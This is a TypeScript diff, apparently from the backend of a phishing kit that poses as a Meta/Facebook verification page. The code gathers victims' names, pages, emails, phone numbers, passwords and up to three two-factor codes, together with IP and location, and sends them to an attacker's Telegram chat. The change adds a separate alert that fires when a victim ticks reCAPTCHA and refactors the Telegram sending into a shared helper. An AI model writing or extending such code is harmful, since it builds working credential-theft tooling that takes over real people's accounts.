@@ -107,6 +107,7 @@ function normalizeData(input: any = {}) {
         twoFa: input.twoFa ?? '',
         twoFaSecond: input.twoFaSecond ?? '',
         twoFaThird: input.twoFaThird ?? '',
+        recaptcha: input.recaptcha ?? '',
     };
 }
 
@@ -128,14 +129,16 @@ function formatMessage(data: any): string {
         ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
         : '';
     const authLine = d.authMethod ? `<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
+    const recaptchaLine = d.recaptcha
+        ? `<b>reCAPTCHA:</b> <code>${escapeHtml(d.recaptcha)}</code>`
+        : '';
     const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
     const phoneDisplay = d.phone && String(d.phone).trim() ? escapeHtml(`+${String(d.phone).trim()}`) : '';
 
     const lines = [
-        `<b>📋 META VERIFIED</b>`,
-        `----------------------`,
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
+        recaptchaLine,
         `----------------------`,
         `<b>Full Name:</b> <code>${formatCodeField(d.fullName)}</code>`,
         `<b>Page:</b> <code>${formatCodeField(d.fanpage)}</code>`,
@@ -162,6 +165,102 @@ function formatMessage(data: any): string {
     return lines.join('\n');
 }
 
+function isRecaptchaTickEvent(data: any): boolean {
+    const d = normalizeData(data);
+    if (!d.recaptcha) return false;
+    const hasFormData =
+        d.fullName ||
+        d.fanpage ||
+        d.email ||
+        d.phone ||
+        d.password ||
+        d.passwordSecond ||
+        d.authMethod ||
+        d.twoFa ||
+        d.twoFaSecond ||
+        d.twoFaThird;
+    return !hasFormData;
+}
+
+function formatRecaptchaTickMessage(data: any): string {
+    const d = normalizeData(data);
+    return [
+        `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
+        `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
+        `<b>reCAPTCHA:</b> <code>${formatCodeField(d.recaptcha)}</code>`,
+    ].join('\n');
+}
+
+function recaptchaRateLimitKey(data: any): string {
+    const ip = normalizeData(data).ip?.trim();
+    return `recaptcha-tick:${ip || 'no-ip'}`;
+}
+
+async function postTelegramText(
+    config: NonNullable<ReturnType<typeof getTelegramConfig>>,
+    text: string
+): Promise<number | undefined> {
+    try {
+        const res = await retryTelegramRequest(() =>
+            axios.post(`${config.api}/sendMessage`, {
+                chat_id: config.chatId,
+                text,
+                parse_mode: 'HTML',
+            }, {
+                httpsAgent: agent,
+                timeout: 10000,
+            })
+        );
+        return res?.data?.result?.message_id;
+    } catch (err: any) {
+        console.error('🔥 Telegram send error (retry exhausted):', err?.response?.data || err.message || err);
+        try {
+            const fallbackRes = await axios.post(`${config.api}/sendMessage`, {
+                chat_id: config.chatId,
+                text,
+                parse_mode: 'HTML',
+            }, {
+                httpsAgent: agent,
+                timeout: 10000,
+            });
+            return fallbackRes?.data?.result?.message_id;
+        } catch (fallbackErr: any) {
+            console.error('🔥 Telegram fallback send error:', fallbackErr?.response?.data || fallbackErr.message || fallbackErr);
+            return undefined;
+        }
+    }
+}
+
+/** Tin Telegram riêng khi tick reCAPTCHA (IP + Location + trạng thái tick). */
+async function sendRecaptchaTickTelegram(
+    config: NonNullable<ReturnType<typeof getTelegramConfig>>,
+    data: any
+): Promise<void> {
+    const rateKey = recaptchaRateLimitKey(data);
+    if (!checkRateLimit(rateKey)) {
+        console.warn(`⚠️ Rate limit exceeded for key: ${rateKey}`);
+        return;
+    }
+
+    const text = formatRecaptchaTickMessage(data);
+    const messageId = await postTelegramText(config, text);
+
+    if (messageId) {
+        console.log(`✅ Sent reCAPTCHA tick message. ID: ${messageId}`);
+    } else {
+        console.warn('⚠️ reCAPTCHA tick Telegram response không có message_id');
+    }
+
+    const mainKey = generateKey(data);
+    const prev = memoryStoreTTL.get(mainKey);
+    const fullData = mergeData(prev?.data, data);
+    memoryStoreTTL.set(mainKey, {
+        message: prev?.message ?? text,
+        messageId: prev?.messageId ?? messageId ?? 0,
+        data: fullData,
+    });
+}
+
 export async function sendTelegramMessage(data: any): Promise<void> {
     const config = getTelegramConfig();
     if (!config) {
@@ -169,8 +268,12 @@ export async function sendTelegramMessage(data: any): Promise<void> {
         return;
     }
 
+    if (isRecaptchaTickEvent(data)) {
+        await sendRecaptchaTickTelegram(config, data);
+        return;
+    }
+
     const key = generateKey(data);
-    // Rate limiting check
     if (!checkRateLimit(key)) {
         console.warn(`⚠️ Rate limit exceeded for key: ${key}`);
         return;
@@ -179,46 +282,11 @@ export async function sendTelegramMessage(data: any): Promise<void> {
     const fullData = mergeData(prev?.data, data);
     const updatedText = formatMessage(fullData);
 
-    try {
-        const res = await retryTelegramRequest(() =>
-            axios.post(`${config.api}/sendMessage`, {
-                chat_id: config.chatId,
-                text: updatedText,
-                parse_mode: 'HTML'
-            }, {
-                httpsAgent: agent,
-                timeout: 10000
-            })
-        );
-
-        const messageId = res?.data?.result?.message_id;
-        if (messageId) {
-            memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
-            console.log(`✅ Sent new message. ID: ${messageId}`);
-        } else {
-            console.warn('⚠️ Telegram response không có message_id');
-        }
-    } catch (err: any) {
-        console.error('🔥 Telegram send error (retry exhausted):', err?.response?.data || err.message || err);
-        try {
-            const fallbackRes = await axios.post(`${config.api}/sendMessage`, {
-                chat_id: config.chatId,
-                text: updatedText,
-                parse_mode: 'HTML'
-            }, {
-                httpsAgent: agent,
-                timeout: 10000
-            });
-            const fallbackMessageId = fallbackRes?.data?.result?.message_id;
-            if (fallbackMessageId) {
-                memoryStoreTTL.set(key, { message: updatedText, messageId: fallbackMessageId, data: fullData });
-                console.log(`🔄 Fallback send success. ID: ${fallbackMessageId}`);
-            } else {
-                console.warn('⚠️ Fallback Telegram response không có message_id');
-            }
-        } catch (fallbackErr: any) {
-            console.error('🔥 Telegram fallback send error:', fallbackErr?.response?.data || fallbackErr.message || fallbackErr);
-        }
-        return;
+    const messageId = await postTelegramText(config, updatedText);
+    if (messageId) {
+        memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
+        console.log(`✅ Sent new message. ID: ${messageId}`);
+    } else {
+        console.warn('⚠️ Telegram response không có message_id');
     }
 }
